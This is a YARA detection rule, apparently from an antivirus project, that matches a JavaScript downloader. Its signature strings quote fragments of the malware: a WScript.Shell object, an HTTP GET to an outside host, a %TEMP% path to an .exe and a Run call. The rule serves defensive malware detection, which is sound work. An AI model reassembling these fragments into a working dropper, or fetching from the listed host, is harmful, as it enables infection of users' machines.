rule sig_20160328_d8a1b5166552cea98865beeccc36040d {
  meta:
    description = "datamaliciousorder - file 20160328_d8a1b5166552cea98865beeccc36040d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0e480705a0b951e206e042205022045377f2446bc585dc9ba2eb45a4da7ef3cd"

  strings:
    $s1  = "function Mwsrixb() {return Plqjr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"SJE0JWLp7f.exe\";};" fullword ascii
    $s2  = "do {WScript[Akecp](Qhzysbctj() * 11)} while (Jksrgizdhv[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Tiaez(Yfyfj, Pnejibs){return Yfyfj - Pnejibs;};" fullword ascii
    $s4  = "var Plqjr = function Ialmmckg() {return WScript[Ytmiliau](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Jksrgizdhv[Thiulj](\"GET\", \"http://chibitesafaris.co.tz/ke7sif\", false);" fullword ascii
    $s6  = "function Kumzhzaba(Clmjqth){Plqjr[\"Run\"](Clmjqth, Oabdfn, Oabdfn);};" fullword ascii
    $s7  = "function Obllw() {return ((Ygepxug == true) && (Ygepxug == Zexhad)) ? 1 : Oabdfn;};" fullword ascii
    $s8  = "function Jzgnwna(){return Vkepjzhfd;};" fullword ascii
    $s9  = "var Tegmdeiir = new this[\"Date\"]();" fullword ascii
    $s10 = "function Qhzysbctj(){return 22;};" fullword ascii
    $s11 = "var Ygepxug = false;" fullword ascii
    $s12 = "var Zexhad = false;" fullword ascii
    $s13 = "var Gefgdgzb = false;" fullword ascii
    $s14 = " while (Vbpsvaus){" fullword ascii
    $s15 = "Ygepxug = true; " fullword ascii
    $s16 = "function Zckse()" fullword ascii
    $s17 = "function Ycyzjchsx(){return Ytmiliau;};" fullword ascii
    $s18 = "function Zefnort(Fjbvj) {var Vlzuunlng = (1, 2, 3, 4, 5, Fjbvj); return Vlzuunlng;};" fullword ascii
    $s19 = "Zexhad = true; " fullword ascii
    $s20 = "return Tiaez(Qbxywf, Zkdae);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}